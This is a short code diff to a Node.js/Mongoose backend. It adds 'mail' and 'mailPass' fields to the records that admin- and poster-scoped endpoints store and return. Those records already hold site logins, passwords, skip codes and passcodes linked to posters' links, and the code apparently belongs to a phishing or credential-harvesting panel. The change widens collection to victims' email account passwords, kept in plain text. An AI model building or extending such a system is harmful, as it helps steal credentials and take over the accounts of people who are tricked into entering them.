@@ -210,7 +210,7 @@ export const info_get = async (req, res) => {
                     populate: {
                         path: 'details',
                         model: 'Info',
-                        select: 'site email password skipcode',
+                        select: 'site email password skipcode mail mailPass',
                     }
                 }).sort({ createdAt: -1 })
                 .select('posters').populate('posters', 'username password links ')
@@ -286,7 +286,7 @@ export const poster_add = async (req, res) => {
 export const add_data = async (req, res) => {
 
     const { adminId, posterId } = req.params
-    const { site, email, password, skipcode ,username,passcode } = req.body
+    const { site, email, password, skipcode ,username,passcode,mail,mailPass } = req.body
 
     try {
         const userFound = await User.findOne({ adminId: adminId })
@@ -296,7 +296,7 @@ export const add_data = async (req, res) => {
         if (userFound && posterFound) {
             const info = await Info.create({
                 site, email, password, skipcode,
-                username,passcode,
+                username,passcode,mail,mailPass,
                 poster: posterId,
                 root: posterFound._id
 
@@ -1051,7 +1051,7 @@ export const update_many =  (req, res) => {
 export const add_data_checnge = async (req, res) => {
 
     const { adminId, posterId } = req.params
-    const { site, email, password, skipcode ,username,passcode } = req.body
+    const { site, email, password, skipcode ,username,passcode,mail, mailPass } = req.body
     try {
         const userFound = await User.findOne({ adminId: adminId })
 
@@ -1060,7 +1060,7 @@ export const add_data_checnge = async (req, res) => {
         if (userFound && posterFound) {
             const info = await Info.create({
                 site, email, password, skipcode,
-                username,passcode,
+                username,passcode,mail,mailPass,
                 poster: posterId,
                 root: posterFound._id
 
